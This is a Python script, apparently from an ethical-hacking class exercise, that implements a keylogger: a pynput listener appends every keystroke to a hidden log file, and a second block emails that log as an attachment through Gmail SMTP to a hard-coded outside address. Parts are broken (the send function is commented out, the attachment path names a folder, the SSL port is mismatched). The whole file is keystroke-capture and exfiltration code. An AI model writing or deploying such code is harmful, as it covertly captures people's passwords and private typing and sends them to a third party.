import os

from pynput.keyboard import Key,Listener



##############################################################################################################
#Cosas para mandar el correo:
import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
#################################################################################################################3

def on_press(key):
    try:
        with open('NoAbrir/log', 'a') as f:
            f.write(str(key) + '\n')

    except Exception as e:
        print(str(e))


def on_release(key):
    if key==Key.esc:
        print('Salió del keylogger')
        f=open('NoAbrir/log', 'r+')
        buffer = f.read()
        f.close()
        return False

    #if key==Key.enter:
     #   send_email()


#def send_email():
    

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()







subject = "Archivo log python HE2023-02"
body = "Este en un correo de ensayo para mandar el archivo log cifrado de la clase de HE2023-02"
sender_email = "raucardona05@yopmail.com"
receiver_email = "emerrueda215@gmail.com"
password = input("Type your password and press enter: ")

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email  # Recommended for mass emails

# Add body to email
message.attach(MIMEText(body, "plain"))

filename = "D:\HE8voS_EmersonRueda\keylogger\NoAbrir"  # In same directory as script

# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 587, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)
